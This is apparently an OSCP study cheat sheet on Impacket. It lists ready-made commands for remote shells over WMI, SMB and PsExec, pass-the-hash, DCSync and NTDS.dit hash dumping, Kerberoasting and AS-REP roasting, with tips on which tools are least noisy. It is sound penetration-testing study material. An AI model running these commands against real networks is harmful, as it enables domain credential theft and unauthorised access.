
# Impacket — Remote Execution & Credential Suite (OSCP)

Python tools for **authenticated** remote code execution and hash dumping against Windows/AD. Not an exploit — you need **working creds first**. Usually **Step 5+** in the workflow (after enum + a valid credential).

**Need at least one of:**
- Username + password
- Username + NTLM hash (→ pass-the-hash, no password needed)

Plus the target IP, and for AD tools the **domain** + **DC IP**.

---

## Binary names on Kali

Current Kali ships them as **`impacket-<tool>`** (on PATH). The classic **`<tool>.py`** names only exist if you installed via pip/git.

```bash
which impacket-wmiexec     # Kali default
which wmiexec.py           # pip/git install
```
All commands below use the `impacket-` form — swap in `.py` if that's what you have.

---

## Typical format for Impacket tools

Every exec tool takes the target as one string. Memorize these two shapes:

```bash
# Password auth
impacket-wmiexec 'DOMAIN/user:password@TARGET_IP'

# Pass-the-hash (no password — note the leading colon, LM half left blank)
impacket-wmiexec 'DOMAIN/user@TARGET_IP' -hashes :NTHASH
```

- Wrap the whole string in **single quotes** → protects `!`, `$`, `\` in the password.
- **Local (non-domain) account** → drop `DOMAIN/` or use `./user`: `'./Administrator:pass@TARGET_IP'`.
- `-hashes` format is `LMHASH:NTHASH`; you almost always only have the NT half → `:NTHASH`.

---

## Remote execution tools

### impacket-wmiexec  → preferred (quiet, no files)
```bash
impacket-wmiexec 'DOMAIN/user:password@TARGET_IP'
impacket-wmiexec 'DOMAIN/user@TARGET_IP' -hashes :NTHASH       # PtH
```
→ Semi-interactive shell via WMI. No service, no file dropped → **least noisy**. Try this first.

### impacket-psexec  → loud but reliable
```bash
impacket-psexec 'DOMAIN/user:password@TARGET_IP'
impacket-psexec 'DOMAIN/user@TARGET_IP' -hashes :NTHASH        # PtH
```
→ Full **SYSTEM** shell. Creates + runs a service on the target (noisy, drops a binary). Use when wmiexec fails or you need guaranteed SYSTEM.

### impacket-smbexec  → fallback
```bash
impacket-smbexec 'DOMAIN/user:password@TARGET_IP'
```
→ Command execution when psexec is blocked / wmiexec is unstable. Clunkier shell, still gets the job done.

---

## impacket-secretsdump  → dump hashes

### Remote (admin creds against a DC = DCSync of the whole domain)
```bash
impacket-secretsdump 'DOMAIN/user:password@DC_IP'
impacket-secretsdump 'DOMAIN/user@DC_IP' -hashes :NTHASH       # PtH
impacket-secretsdump 'DOMAIN/user:password@DC_IP' -just-dc-ntlm   # NTLM only, skip kerberos keys
```

### Local — from a SAM + SYSTEM hive (local accounts of one host)
```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

### Local — from NTDS.dit + SYSTEM (offline AD database → EVERY domain hash)
```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL   # + LSA secrets / cached creds
```
→ Use when you've pulled `ntds.dit` + the `SYSTEM` hive off a box/share. `SYSTEM` holds the boot key that decrypts `ntds.dit` — you need both. `-security` is optional (adds LSA secrets + cached domain creds).

**Output (all modes):** `user:RID:LMhash:NThash:::`
- The **NThash** (4th field) → crack with Hashcat `-m 1000`, **or** reuse directly via pass-the-hash. See [[Hashcat]].

### Or split the output → `users.txt` + `hashes.txt` (for nxc / cme)

First save the dump (redirect, or `tee`):
```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL | tee dump.ntds
```
→ Full walkthrough + WinRM/RDP variants in [[NetExec]] "Pass-the-Hash — Bulk Testing After NTDS Dump".

---

## AD attacks (need domain + DC IP)

### impacket-GetUserSPNs  → Kerberoasting
```bash
impacket-GetUserSPNs 'DOMAIN/user:password' -dc-ip DC_IP -request
```
→ Requests TGS tickets for service accounts (accounts with an SPN). Needs **any valid domain user**. Output = Kerberos **TGS hashes** → crack offline (Hashcat `-m 13100`).

### impacket-GetNPUsers  → AS-REP Roasting
```bash
impacket-GetNPUsers 'DOMAIN/' -usersfile users.txt -no-pass -dc-ip DC_IP -format hashcat
```
→ Targets accounts with **pre-auth disabled** (`DONT_REQ_PREAUTH`). Needs only **usernames** (no creds → `-no-pass`). Output = **AS-REP hashes** → crack offline (Hashcat `-m 18200`).

---

## Related Notes
- [[NetExec]] — validate creds + spray before reaching for impacket
- [[CrackMapExec]]
- [[Hashcat]] — crack the hashes these tools produce
- [[Mimikatz]]
- [[Password_Spraying]]
